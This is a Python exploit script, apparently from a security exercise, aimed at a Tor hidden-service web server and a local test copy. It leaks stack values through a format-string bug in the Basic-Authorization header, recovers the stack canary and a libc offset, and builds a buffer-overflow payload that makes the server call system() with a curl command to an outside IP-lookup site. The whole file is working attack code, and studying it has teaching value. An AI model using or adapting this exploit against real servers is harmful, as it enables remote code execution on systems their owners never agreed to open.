import requests
import requests_tor
from requests_tor import RequestsTor
import os

rt = RequestsTor() #for Tor Browser
rt = RequestsTor(tor_ports=(9050,), tor_cport=9051) #for Tor
# rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor

url = 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/'
url2 = 'http://127.0.0.1:8000/'

headers={
    "Host":"zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/",
    "Authorization":"Basic JXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXg6",
    }

#Getting the information leak from format string parameter exploit using the headers above. Authorization consists of the string %x. repeated 31 times (in base64 encoded format).
#This request here is for the remote server.
r = rt.get(url, headers=headers)
remote_data = r.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-6:]#The last six values are the ones we need.

#Same request for our local server.
r2 = requests.get(url2, headers=headers)
local_data = r2.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-6:]

#Getting remote ebp and canary.
ebp = remote_data[-2]
canary = remote_data[1]

#Here we get the difference between the remote libc address and the local one.
diff =  int(remote_data[0],base=16) - int(local_data[0],base=16)
#print(diff)

#Adding the difference to the local system address.
ret_addr = int('f7aad830',base=16) + diff 
ret_addr = hex(ret_addr)[2:]

#Offset of 232 bytes behind the ebp is the buffer address.
buffer_addr = int(ebp, base=16) - 232
buffer_addr = hex(buffer_addr)[2:].replace('00', '04') #Some executions have 00 at the end of the canary address, so we replace it with 04 here (sic)

#Offset of 144 bytes behind the ebp is the argument address.
arg_addr = int(ebp, base=16) - 144
arg_addr = hex(arg_addr)[2:]

#Argument of system function.
text_payload_1 = "curl checkip.dyndns.org"
text_payload_1 = ''.join(hex(ord(x))[2:] for x in text_payload_1)

padding_size = int(60/4)

#Some executions have 00 at the end of the return address, so we replace it with 26 here (it will be replaced by 00 by the for loop anyway).
ret_addr = ret_addr.replace('00', '26')

#Reversing by two bytes the values we have (because of little endianness).
ret_addr = "".join(reversed([r'\x' + ret_addr[i:i+2] for i in range(0, len(ret_addr), 2)]))
buffer_addr = "".join(reversed([r'\x' + buffer_addr[i:i+2] for i in range(0, len(buffer_addr), 2)]))
canary = "".join(reversed([r'\x' + canary[i:i+2] for i in range(0, len(canary), 2)])).replace('00', '26')
arg_addr = "".join(reversed([r'\x' + arg_addr[i:i+2] for i in range(0, len(arg_addr), 2)])).replace('00', '26')#Some executions have 00 at the end of the buffer address, so we replace it with 26 here.
text_payload_1 = "".join(([r'\x' + text_payload_1[i:i+2] for i in range(0, len(text_payload_1), 2)]))
text_payload_1 += r'\0'

#Building the attack string.
attack_str = ''

for i in range(0, padding_size):
    attack_str += buffer_addr

for i in range(0, 4):
    attack_str += canary

attack_str += ret_addr

for i in range(0, 2):
    attack_str += arg_addr

attack_str += text_payload_1

print(attack_str)

